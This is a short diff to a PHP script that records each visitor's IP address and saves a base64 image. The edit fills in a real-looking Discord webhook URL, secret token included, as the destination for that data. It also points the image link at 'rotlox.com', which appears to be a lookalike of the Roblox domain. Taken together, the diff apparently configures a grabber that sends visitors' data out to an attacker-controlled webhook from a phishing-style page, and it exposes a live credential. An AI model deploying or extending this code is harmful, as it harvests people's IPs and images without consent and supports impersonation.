@@ -2,7 +2,7 @@
 
 date_default_timezone_set("Asia/Kuala_Lumpur"); // Set your timezone
 
-$webhookurl = "https://discord.com/api/webhooks/"; // Your webhook URL
+$webhookurl = "https://discord.com/api/webhooks/1303816422392336506/k5X-pVgUGyWZZHCaCysyuxQb5LtdtNazd8nAiCZfBTj0Vvlu34MgRhYwNGUzuIQn_qyc/"; // Your webhook URL
 
 //Get the visitor's IP
 $IP = (isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER['REMOTE_ADDR']);
@@ -47,7 +47,7 @@ $file = $folderPath . $fileName;
 file_put_contents($file, $image_base64);
 
 // Set your image url
-$url = "yourwebsite/images/{$fileName}";
+$url ="https://www.rotlox.com/dashboard/settings";
 
 $timestamp = date("c", strtotime("now"));
 
